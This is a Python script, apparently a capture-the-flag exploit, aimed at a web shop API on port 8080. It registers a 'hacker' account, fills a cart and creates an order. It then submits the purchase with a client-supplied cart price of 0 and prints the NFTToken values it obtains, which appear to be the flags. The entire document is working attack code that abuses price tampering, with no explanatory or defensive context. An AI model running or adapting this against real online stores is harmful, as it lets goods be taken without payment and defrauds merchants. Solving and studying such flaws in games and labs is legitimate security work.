import requests
import sys

HOST = sys.argv[1]
PORT = '8080'
hint = sys.argv[2]
URL = f'http://{HOST}:{PORT}'

with requests.Session() as s:
    user = {"username" : "hacker", "password" : "hacker_password"}
    s.post(f'{URL}/api/v1/register', json=user)
    s.post(f'{URL}/api/v1/login', json=user)
    resp = s.post(f'{URL}/api/v1/catalogue', json={"page": 1, "limit" : 2})
    for i in resp.json()["rows"]:
        resp = s.put(f'{URL}/api/v1/cart?id={i["ID"]}')
    resp = s.get(f'{URL}/api/v1/cart')
    resp = s.post(f'{URL}/api/v1/order', json={"status":"created", "cart_id": (cart_id := resp.json()["ID"])})
    resp = s.post(f'{URL}/api/v1/buy', json={"ID":resp.json()["ID"], "cart" : {"price" : 0}, "cart_id" : cart_id})
    resp = s.get(f'{URL}/api/v1/profile')
    for i in resp.json()["merchandise"]:
        print(i["NFTToken"])